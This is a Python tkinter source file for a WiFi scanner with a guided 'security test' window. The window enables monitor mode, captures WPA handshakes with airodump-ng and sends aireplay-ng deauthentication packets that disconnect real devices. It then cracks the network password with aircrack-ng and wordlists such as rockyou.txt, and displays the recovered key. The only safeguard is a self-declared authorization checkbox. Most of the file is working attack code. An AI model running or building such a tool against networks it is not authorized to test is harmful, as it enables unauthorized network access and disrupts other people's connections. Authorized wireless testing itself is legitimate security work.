"""Self-contained WiFi scanner and authorized testing UI, extracted from NetSuite."""
import glob
import os
import queue
import re
import subprocess
import tempfile
import threading
import time
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
IS_ROOT = (os.geteuid() == 0) if hasattr(os, "geteuid") else False
BG_COLOR = "#14161c"
PANEL_BG = "#1c1f28"
TEXT_COLOR = "#d7dce3"
FG_COLOR = "#00FF41"
ACCENT = "#4fa3f7"
WARN = "#e05656"
GOOD = "#5cc26a"
MEDIUM = "#e0b356"


def export_treeview_to_csv(parent_widget, tree, default_name="export.csv"):
    """Exports every row currently shown in a Treeview to a CSV file the user picks."""
    from tkinter import filedialog
    import csv as csv_module

    path = filedialog.asksaveasfilename(
        parent=parent_widget, defaultextension=".csv", initialfile=default_name,
        filetypes=[("CSV files", "*.csv"), ("All files", "*.*")]
    )
    if not path:
        return False

    columns = tree["columns"]
    headers = [tree.heading(col)["text"] for col in columns]

    try:
        with open(path, "w", newline="") as f:
            writer = csv_module.writer(f)
            writer.writerow(headers)
            for item_id in tree.get_children(""):
                writer.writerow(tree.item(item_id, "values"))
        return True
    except OSError as e:
        print(f"[NetSuite] Export failed: {e}")
        return False


def copy_to_clipboard(widget, text):
    widget.clipboard_clear()
    widget.clipboard_append(text)


def show_treeview_context_menu(event, tree, menu_items):
    """Selects the row under the cursor (if any) and pops up a context menu.
    menu_items: list of (label, callback) tuples, or None for a separator."""
    row_id = tree.identify_row(event.y)
    if row_id:
        tree.selection_set(row_id)

    menu = tk.Menu(tree, tearoff=0)
    for item in menu_items:
        if item is None:
            menu.add_separator()
        else:
            label, callback = item
            menu.add_command(label=label, command=callback)
    menu.tk_popup(event.x_root, event.y_root)


class Tooltip:
    """Small hover tooltip explaining what a widget does, in plain language."""

    def __init__(self, widget, text):
        self.widget = widget
        self.text = text
        self.tip_window = None
        widget.bind("<Enter>", self.show)
        widget.bind("<Leave>", self.hide)

    def show(self, event=None):
        if self.tip_window or not self.text:
            return
        x = self.widget.winfo_rootx() + 10
        y = self.widget.winfo_rooty() + self.widget.winfo_height() + 5
        self.tip_window = tk.Toplevel(self.widget)
        self.tip_window.wm_overrideredirect(True)
        self.tip_window.wm_geometry(f"+{x}+{y}")
        label = tk.Label(self.tip_window, text=self.text, justify="left", wraplength=280,
                          background="#2a2f3a", foreground="#d7dce3", relief="solid", borderwidth=1,
                          font=("Consolas", 9), padx=6, pady=4)
        label.pack()

    def hide(self, event=None):
        if self.tip_window:
            self.tip_window.destroy()
            self.tip_window = None


def run_shell(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except FileNotFoundError:
        return -1, "", f"{cmd[0]} not found — is aircrack-ng installed? (sudo apt install aircrack-ng)"
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out."


def list_wifi_interfaces():
    code, out, err = run_shell(["iw", "dev"])
    interfaces = []
    if code == 0:
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("Interface"):
                interfaces.append(line.split()[1])
    return interfaces


class SecurityTestMonitorManager:
    """Puts ONE interface into monitor mode without disturbing NetworkManager's
    control of anything else, and always hands it back cleanly afterward."""

    def __init__(self, log_fn):
        self.log = log_fn
        self.monitor_iface = None
        self.original_iface = None

    def enable(self, iface):
        self.log(f"Pausing normal WiFi management on {iface} (other connections stay up)...")
        run_shell(["nmcli", "device", "set", iface, "managed", "no"], timeout=10)
        time.sleep(1)

        before = set(list_wifi_interfaces())
        self.log(f"Switching {iface} into monitor mode...")
        code, out, err = run_shell(["airmon-ng", "start", iface], timeout=15)
        if code != 0:
            run_shell(["nmcli", "device", "set", iface, "managed", "yes"], timeout=10)
            return None, err or "Failed to start monitor mode."

        time.sleep(1.5)
        after = set(list_wifi_interfaces())
        new_candidates = after - before
        new_iface = next((c for c in new_candidates if "mon" in c), None) \
            or (next(iter(new_candidates), None) if new_candidates else None) \
            or next((c for c in after if "mon" in c), None) \
            or iface

        self.original_iface = iface
        self.monitor_iface = new_iface
        self.log(f"Monitor mode active on '{new_iface}'.")
        return new_iface, None

    def disable(self):
        if not self.monitor_iface:
            return
        self.log(f"Restoring {self.monitor_iface} to normal WiFi mode...")
        run_shell(["airmon-ng", "stop", self.monitor_iface], timeout=15)
        if self.original_iface:
            run_shell(["nmcli", "device", "set", self.original_iface, "managed", "yes"], timeout=10)
        self.log("Done — normal WiFi scanning is available again.")
        self.monitor_iface = None
        self.original_iface = None


class HandshakeCaptureThread(threading.Thread):
    def __init__(self, iface, bssid, channel, event_queue, cap_prefix):
        super().__init__(daemon=True)
        self.iface = iface
        self.bssid = bssid
        self.channel = channel
        self.event_queue = event_queue
        self.cap_prefix = cap_prefix
        self.process = None
        self._stop_flag = threading.Event()

    def stop(self):
        self._stop_flag.set()
        if self.process:
            try:
                self.process.terminate()
            except Exception:
                pass

    def run(self):
        cmd = ["airodump-ng", "--bssid", self.bssid, "--channel", str(self.channel),
               "--write", self.cap_prefix, "--output-format", "pcap", self.iface]
        try:
            self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            self.event_queue.put(("sectest_error", "airodump-ng not found."))
            return

        self.event_queue.put(("sectest_status", f"Listening for a handshake on channel {self.channel}..."))

        while not self._stop_flag.is_set():
            time.sleep(3)
            cap_file = self._find_cap_file()
            if cap_file and self._check_handshake(cap_file):
                self.event_queue.put(("sectest_handshake_captured", cap_file))
                break

        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except Exception:
                self.process.kill()

    def _find_cap_file(self):
        matches = sorted(glob.glob(self.cap_prefix + "-*.cap"))
        return matches[-1] if matches else None

    def _check_handshake(self, cap_file):
        code, out, err = run_shell(["aircrack-ng", cap_file], timeout=15)
        return "1 handshake" in out or ("handshake" in out.lower() and "0 handshake" not in out.lower())


def send_deauth_packets(iface, bssid, client_mac=None, count=5):
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client_mac:
        cmd += ["-c", client_mac]
    cmd.append(iface)
    return run_shell(cmd, timeout=20)


class PasswordCrackThread(threading.Thread):
    def __init__(self, cap_file, wordlist, bssid, event_queue):
        super().__init__(daemon=True)
        self.cap_file = cap_file
        self.wordlist = wordlist
        self.bssid = bssid
        self.event_queue = event_queue
        self.process = None
        self._stop_flag = threading.Event()

    def stop(self):
        self._stop_flag.set()
        if self.process:
            try:
                self.process.terminate()
            except Exception:
                pass

    def run(self):
        cmd = ["aircrack-ng", "-w", self.wordlist, "-b", self.bssid, self.cap_file]
        try:
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        except FileNotFoundError:
            self.event_queue.put(("sectest_error", "aircrack-ng not found."))
            return

        self.event_queue.put(("sectest_status", "Cracking — this can take a while depending on wordlist size..."))

        for line in self.process.stdout:
            if self._stop_flag.is_set():
                break
            line = line.strip()
            if not line:
                continue
            self.event_queue.put(("sectest_crack_line", line))
            key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", line)
            if key_match:
                self.event_queue.put(("sectest_crack_success", key_match.group(1)))

        self.process.wait()
        if not self._stop_flag.is_set():
            self.event_queue.put(("sectest_crack_done", None))


class SecurityTestWindow:
    """Guided popup: enable monitor mode -> capture handshake (+ optional
    deauth) -> crack with a wordlist -> always restore managed mode on close."""

    def __init__(self, parent, bssid, essid, channel, security):
        self.bssid = bssid
        self.essid = essid
        self.channel = channel
        self.security = security
        self.event_queue = queue.Queue()

        self.monitor_mgr = SecurityTestMonitorManager(self._log)
        self.capture_thread = None
        self.crack_thread = None
        self.current_cap_file = None
        self.authorized = tk.BooleanVar(value=False)

        self.win = tk.Toplevel(parent)
        self.win.title(f"Security Test — {essid}")
        self.win.geometry("760x640")
        self.win.configure(bg=BG_COLOR)
        self.win.protocol("WM_DELETE_WINDOW", self.on_close)

        self._build_ui()
        self._poll_queue()

    def _build_ui(self):
        header = ttk.Frame(self.win, padding=12)
        header.pack(fill="x")
        ttk.Label(header, text=f"{self.essid}  ({self.bssid})  •  ch {self.channel}  •  {self.security}",
                  font=("Consolas", 13, "bold"), foreground=ACCENT).pack(anchor="w")

        if not self.security or self.security.upper() in ("", "--", "NONE", "OPEN"):
            ttk.Label(header, foreground=MEDIUM, wraplength=700, justify="left",
                      text="This network is open (no password) — nothing to crack. Worth knowing: anyone "
                           "nearby can join it and see unencrypted traffic.").pack(anchor="w", pady=(10, 0))
            return

        auth_check = ttk.Checkbutton(header, variable=self.authorized, command=self._on_auth_toggle,
                                      text="I own this network / have authorization to test it")
        auth_check.pack(anchor="w", pady=(8, 5))

        step_frame = ttk.Frame(self.win, padding=(12, 0))
        step_frame.pack(fill="x")

        ttk.Label(step_frame, text="Interface:").grid(row=0, column=0, sticky="w")
        self.iface_combo = ttk.Combobox(step_frame, width=15, values=list_wifi_interfaces(), state="readonly")
        if self.iface_combo["values"]:
            self.iface_combo.current(0)
        self.iface_combo.grid(row=0, column=1, padx=(5, 15))

        self.start_button = ttk.Button(step_frame, text="1. Start Capture (monitor mode)",
                                        command=self.start_capture, state="disabled")
        self.start_button.grid(row=0, column=2, padx=5)

        self.deauth_button = ttk.Button(step_frame, text="Send Deauth (speed up capture)",
                                         command=self.do_deauth, state="disabled")
        self.deauth_button.grid(row=0, column=3, padx=5)

        self.stop_button = ttk.Button(step_frame, text="Stop / Restore WiFi", command=self.stop_and_restore)
        self.stop_button.grid(row=1, column=0, columnspan=2, pady=(10, 0), sticky="w")

        self.handshake_status = ttk.Label(step_frame, text="Handshake captured: No", foreground=WARN)
        self.handshake_status.grid(row=1, column=2, columnspan=2, pady=(10, 0), sticky="w")

        crack_frame = ttk.Frame(self.win, padding=12)
        crack_frame.pack(fill="x")
        ttk.Label(crack_frame, text="2. Wordlists (tried in order):").pack(anchor="w")

        wordlist_row = ttk.Frame(crack_frame)
        wordlist_row.pack(fill="x", pady=(4, 0))
        self.wordlist_listbox = tk.Listbox(wordlist_row, height=4, bg="#111", fg=FG_COLOR, selectbackground="#333")
        self.wordlist_listbox.pack(side="left", fill="x", expand=True)
        self.wordlist_listbox.insert("end", "/usr/share/wordlists/rockyou.txt")

        list_buttons = ttk.Frame(wordlist_row)
        list_buttons.pack(side="left", padx=(8, 0))
        ttk.Button(list_buttons, text="Add...", command=self.add_wordlist).pack(fill="x", pady=(0, 4))
        ttk.Button(list_buttons, text="Remove Selected", command=self.remove_wordlist).pack(fill="x")

        self.crack_button = ttk.Button(crack_frame, text="Start Cracking", command=self.start_crack, state="disabled")
        self.crack_button.pack(anchor="e", pady=(8, 0))

        self.result_label = ttk.Label(self.win, text="", font=("Consolas", 14, "bold"), padding=(12, 5))
        self.result_label.pack(fill="x")

        ttk.Label(self.win, text="Activity Log:", padding=(12, 0)).pack(anchor="w")
        self.log_text = tk.Text(self.win, height=14, state="disabled", wrap="word", bg="#111", fg="#ddd")
        self.log_text.pack(fill="both", expand=True, padx=12, pady=(0, 12))

    def _on_auth_toggle(self):
        enabled = self.authorized.get()
        self.start_button.config(state="normal" if enabled else "disabled")
        self.deauth_button.config(state="normal" if (enabled and self.capture_thread) else "disabled")

    def add_wordlist(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            self.wordlist_listbox.insert("end", path)

    def remove_wordlist(self):
        selection = self.wordlist_listbox.curselection()
        if selection:
            self.wordlist_listbox.delete(selection[0])

    # ---------------- Workflow actions ----------------

    def start_capture(self):
        iface = self.iface_combo.get()
        if not iface:
            self._log("Select a wireless interface first.")
            return

        self.start_button.config(state="disabled")

        def worker():
            new_iface, error = self.monitor_mgr.enable(iface)
            if error:
                self.event_queue.put(("sectest_error", error))
                return
            self.event_queue.put(("sectest_monitor_ready", new_iface))

        threading.Thread(target=worker, daemon=True).start()

    def _begin_capture_thread(self, monitor_iface):
        cap_prefix = os.path.join(tempfile.gettempdir(), f"netsuite_sectest_{self.bssid.replace(':', '')}")
        for f in glob.glob(cap_prefix + "*"):
            try:
                os.remove(f)
            except OSError:
                pass
        self.capture_thread = HandshakeCaptureThread(monitor_iface, self.bssid, self.channel, self.event_queue, cap_prefix)
        self.capture_thread.start()
        if self.authorized.get():
            self.deauth_button.config(state="normal")

    def do_deauth(self):
        if not self.authorized.get() or not self.monitor_mgr.monitor_iface:
            return
        confirm = messagebox.askyesno(
            "Confirm deauth",
            f"Send deauthentication packets to {self.bssid} ({self.essid})?\n\n"
            "This disconnects real devices from the network momentarily, forcing them to reconnect "
            "and (hopefully) letting us capture the handshake faster. Only proceed with authorization."
        )
        if not confirm:
            return

        iface = self.monitor_mgr.monitor_iface

        def worker():
            code, out, err = send_deauth_packets(iface, self.bssid)
            if code == 0:
                self.event_queue.put(("sectest_status", "Deauth packets sent."))
            else:
                self.event_queue.put(("sectest_status", f"Deauth may have failed: {err.strip() if err else 'unknown error'}"))

        threading.Thread(target=worker, daemon=True).start()
        self._log(f"Sent deauth to {self.bssid}.")

    def stop_and_restore(self):
        if self.capture_thread:
            self.capture_thread.stop()
            self.capture_thread = None
        threading.Thread(target=self.monitor_mgr.disable, daemon=True).start()
        self.start_button.config(state="normal" if self.authorized.get() else "disabled")
        self.deauth_button.config(state="disabled")

    def start_crack(self):
        wordlists = list(self.wordlist_listbox.get(0, "end"))
        wordlists = [w for w in wordlists if os.path.exists(w)]
        if not self.current_cap_file or not os.path.exists(self.current_cap_file):
            self._log("Capture a handshake before cracking.")
            return
        if not wordlists:
            self._log("Add at least one valid wordlist file first.")
            return

        self.log_text.config(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.config(state="disabled")
        self.result_label.config(text="")

        # aircrack-ng accepts multiple wordlists as a comma-separated -w argument,
        # trying each one in order until the key is found or all are exhausted.
        combined_wordlist_arg = ",".join(wordlists)
        self._log(f"Trying {len(wordlists)} wordlist(s) in order: {', '.join(wordlists)}")
        self.crack_thread = PasswordCrackThread(self.current_cap_file, combined_wordlist_arg, self.bssid, self.event_queue)
        self.crack_thread.start()
        self.crack_button.config(state="disabled")

    def on_close(self):
        if self.capture_thread:
            self.capture_thread.stop()
        if self.crack_thread:
            self.crack_thread.stop()
        if self.monitor_mgr.monitor_iface:
            self._log("Window closing — restoring WiFi before exit...")
            self.monitor_mgr.disable()
        self.win.destroy()

    # ---------------- Queue polling ----------------

    def _poll_queue(self):
        try:
            while True:
                kind, payload = self.event_queue.get_nowait()
                if kind == "sectest_status":
                    self._log(payload)
                elif kind == "sectest_error":
                    self._log(f"ERROR: {payload}")
                    self.start_button.config(state="normal" if self.authorized.get() else "disabled")
                elif kind == "sectest_monitor_ready":
                    self._begin_capture_thread(payload)
                elif kind == "sectest_handshake_captured":
                    self.current_cap_file = payload
                    self.handshake_status.config(text=f"Handshake captured: YES", foreground=GOOD)
                    self._log(f"Handshake captured: {payload}")
                    self.crack_button.config(state="normal")
                    self.deauth_button.config(state="disabled")
                    try:
                        subprocess.run(["notify-send", "Handshake captured!", f"{self.essid} ({self.bssid})"],
                                        check=False, timeout=5)
                    except Exception:
                        pass
                elif kind == "sectest_crack_line":
                    self.log_text.config(state="normal")
                    self.log_text.insert("end", payload + "\n")
                    self.log_text.see("end")
                    self.log_text.config(state="disabled")
                elif kind == "sectest_crack_success":
                    self.result_label.config(text=f"✅ PASSWORD FOUND: {payload}", foreground=GOOD)
                    self.crack_button.config(state="normal")
                    try:
                        subprocess.run(["notify-send", "WiFi password cracked!", f"{self.essid}: {payload}"],
                                        check=False, timeout=5)
                    except Exception:
                        pass
                elif kind == "sectest_crack_done":
                    if not self.result_label.cget("text"):
                        self.result_label.config(text="❌ Password not found in these wordlists.", foreground=WARN)
                    self.crack_button.config(state="normal")
        except queue.Empty:
            pass
        if self.win.winfo_exists():
            self.win.after(300, self._poll_queue)

    def _log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.config(state="normal")
        self.log_text.insert("end", f"[{timestamp}] {message}\n")
        self.log_text.see("end")
        self.log_text.config(state="disabled")


class WifiScannerThread(threading.Thread):
    def __init__(self, event_queue, interval, auto_refresh):
        super().__init__(daemon=True)
        self.event_queue = event_queue
        self.interval = interval
        self.auto_refresh = auto_refresh
        self._stop_flag = threading.Event()

    def stop(self):
        self._stop_flag.set()

    @staticmethod
    def split_terse_line(line):
        parts = re.split(r"(?<!\\):", line)
        return [p.replace("\\:", ":") for p in parts]

    def scan(self):
        fields = ["SSID", "BSSID", "CHAN", "SIGNAL", "SECURITY", "RATE"]
        cmd = ["nmcli", "-t", "-f", ",".join(fields), "dev", "wifi", "list", "--rescan", "yes"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            raise RuntimeError(result.stderr.strip() or "nmcli error")
        networks = []
        for line in result.stdout.strip().splitlines():
            if not line.strip():
                continue
            parts = self.split_terse_line(line)
            if len(parts) < 6:
                continue
            ssid, bssid, chan, signal, security, rate = parts[:6]
            networks.append({
                "ssid": ssid if ssid else "<Hidden Network>",
                "bssid": bssid, "channel": chan,
                "signal": int(signal) if signal.isdigit() else 0,
                "security": security if security else "Open", "rate": rate,
            })
        networks.sort(key=lambda n: n["signal"], reverse=True)
        return networks

    def run(self):
        while not self._stop_flag.is_set():
            try:
                self.event_queue.put(("networks", self.scan()))
            except FileNotFoundError:
                self.event_queue.put(("error", "nmcli not found (sudo apt install network-manager)"))
                return
            except Exception as e:
                self.event_queue.put(("error", str(e)))
            if not self.auto_refresh:
                break
            slept = 0
            while slept < self.interval and not self._stop_flag.is_set():
                time.sleep(1)
                slept += 1


def signal_bars(signal):
    if signal >= 80:
        return "▂▄▆█"
    elif signal >= 60:
        return "▂▄▆_"
    elif signal >= 40:
        return "▂▄__"
    elif signal >= 20:
        return "▂___"
    return "____"


class WifiScannerTab:
    def __init__(self, parent):
        self.frame = ttk.Frame(parent, padding=10)
        self.event_queue = queue.Queue()
        self.scanner_thread = None
        self.last_networks = []
        self._build_ui()
        self._poll_queue()

    def _build_ui(self):
        controls = ttk.Frame(self.frame)
        controls.pack(fill="x")

        self.scan_button = ttk.Button(controls, text="Scan Now", command=self.scan_once)
        self.scan_button.grid(row=0, column=0, padx=(0, 15))

        self.auto_refresh_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(controls, text="Auto-refresh every", variable=self.auto_refresh_var,
                         command=self._toggle_auto_refresh).grid(row=0, column=1)

        self.interval_entry = ttk.Entry(controls, width=6)
        self.interval_entry.insert(0, "30")
        self.interval_entry.grid(row=0, column=2, padx=5)
        ttk.Label(controls, text="sec").grid(row=0, column=3)

        self.status_label = ttk.Label(controls, text="Idle.")
        self.status_label.grid(row=0, column=4, padx=20)

        self.clear_button = ttk.Button(controls, text="Clear Results", command=self.clear_results)
        self.clear_button.grid(row=0, column=5, padx=5)
        self.export_button = ttk.Button(controls, text="Export CSV", command=self.export_csv)
        self.export_button.grid(row=0, column=6, padx=5)

        search_row = ttk.Frame(self.frame)
        search_row.pack(fill="x", pady=(8, 5))
        ttk.Label(search_row, text="Search:").pack(side="left")
        self.search_var = tk.StringVar()
        self.search_var.trace_add("write", lambda *args: self._refresh_table(self.last_networks))
        search_entry = ttk.Entry(search_row, textvariable=self.search_var, width=30)
        search_entry.pack(side="left", padx=(5, 0))

        columns = ("ssid", "signal", "bars", "channel", "security", "bssid", "rate")
        self.tree = ttk.Treeview(self.frame, columns=columns, show="headings", height=14)
        for col, label, width in [("ssid", "SSID", 200), ("signal", "Signal %", 70), ("bars", "Strength", 90),
                                   ("channel", "Channel", 70), ("security", "Security", 130),
                                   ("bssid", "BSSID", 150), ("rate", "Rate", 100)]:
            self.tree.heading(col, text=label, command=lambda c=col: self._sort_by(c))
            self.tree.column(col, width=width, anchor="w")
        self.tree.tag_configure("strong", foreground="#1a7a1a")
        self.tree.tag_configure("weak", foreground="#a04040")
        self.tree.bind("<Button-3>", self._on_right_click)
        self.tree.bind("<<TreeviewSelect>>", self._on_select)
        self.tree.pack(fill="both", expand=True, pady=(10, 0))

        self.count_label = ttk.Label(self.frame, text="No scan yet.")
        self.count_label.pack(anchor="w", pady=(5, 0))

        action_row = ttk.Frame(self.frame)
        action_row.pack(fill="x", pady=(8, 0))
        ttk.Label(action_row, text="Only your own networks, please 🙂", foreground="#888888").pack(side="left")
        self.security_test_button = ttk.Button(action_row, text="Test Security of Selected Network",
                                                 command=self.test_security_selected, state="disabled")
        self.security_test_button.pack(side="right")

    def _on_select(self, event):
        self.security_test_button.config(state="normal" if self.tree.selection() else "disabled")

    def _selected_network_values(self):
        selection = self.tree.selection()
        if not selection:
            return None
        return self.tree.item(selection[0], "values")

    def test_security_selected(self):
        values = self._selected_network_values()
        if not values:
            return
        ssid, signal, bars, channel, security, bssid, rate = values
        SecurityTestWindow(self.frame.winfo_toplevel(), bssid, ssid, channel, security)

    def _on_right_click(self, event):
        row_id = self.tree.identify_row(event.y)
        if not row_id:
            return
        self.tree.selection_set(row_id)
        values = self.tree.item(row_id, "values")
        ssid, signal, bars, channel, security, bssid, rate = values
        show_treeview_context_menu(event, self.tree, [
            ("Copy SSID", lambda: copy_to_clipboard(self.tree, ssid)),
            ("Copy BSSID", lambda: copy_to_clipboard(self.tree, bssid)),
            None,
            ("Test Security (crack password)...", lambda: SecurityTestWindow(
                self.frame.winfo_toplevel(), bssid, ssid, channel, security)),
        ])

    def export_csv(self):
        if not self.tree.get_children():
            self.status_label.config(text="Nothing to export yet.")
            return
        if export_treeview_to_csv(self.frame, self.tree, "netsuite_wifi_scan.csv"):
            self.status_label.config(text="Exported to CSV.")

    def clear_results(self):
        self.last_networks = []
        self.tree.delete(*self.tree.get_children())
        self.count_label.config(text="No scan yet.")

    def scan_once(self):
        if self.scanner_thread and self.scanner_thread.is_alive():
            return
        self.status_label.config(text="Scanning...")
        self.scanner_thread = WifiScannerThread(self.event_queue, interval=0, auto_refresh=False)
        self.scanner_thread.start()

    def _toggle_auto_refresh(self):
        if self.auto_refresh_var.get():
            try:
                interval = int(self.interval_entry.get().strip())
                if interval < 5:
                    raise ValueError
            except ValueError:
                self.status_label.config(text="Enter 5 or more seconds.", foreground=WARN)
                self.auto_refresh_var.set(False)
                return
            if self.scanner_thread and self.scanner_thread.is_alive():
                self.scanner_thread.stop()
            self.scanner_thread = WifiScannerThread(self.event_queue, interval=interval, auto_refresh=True)
            self.scanner_thread.start()
            self.status_label.config(text=f"Auto-refreshing every {interval}s...")
        else:
            if self.scanner_thread:
                self.scanner_thread.stop()
            self.status_label.config(text="Auto-refresh stopped.")

    def _sort_by(self, col):
        items = [(self.tree.set(k, col), k) for k in self.tree.get_children("")]
        if col in ("signal", "channel"):
            items.sort(key=lambda t: int(t[0]) if t[0].isdigit() else 0, reverse=True)
        else:
            items.sort(key=lambda t: t[0].lower())
        for index, (_, k) in enumerate(items):
            self.tree.move(k, "", index)

    def _poll_queue(self):
        try:
            while True:
                kind, payload = self.event_queue.get_nowait()
                if kind == "networks":
                    self._refresh_table(payload)
                    if not self.auto_refresh_var.get():
                        self.status_label.config(text="Idle.")
                elif kind == "error":
                    self.status_label.config(text=f"Error: {payload}")
                    self.count_label.config(text=payload)
        except queue.Empty:
            pass
        self.frame.after(300, self._poll_queue)

    def _refresh_table(self, networks):
        self.last_networks = networks
        self.tree.delete(*self.tree.get_children())
        query = self.search_var.get().strip().lower() if hasattr(self, "search_var") else ""
        shown = 0
        for net in networks:
            haystack = f"{net['ssid']} {net['bssid']} {net['security']}".lower()
            if query and query not in haystack:
                continue
            shown += 1
            tag = "strong" if net["signal"] >= 60 else ("weak" if net["signal"] < 30 else "")
            self.tree.insert("", "end", values=(net["ssid"], net["signal"], signal_bars(net["signal"]),
                                                 net["channel"], net["security"], net["bssid"], net["rate"]),
                              tags=(tag,) if tag else ())
        if query:
            self.count_label.config(text=f"{shown} of {len(networks)} network(s) match.")
        else:
            self.count_label.config(text=f"{len(networks)} network(s) found.")
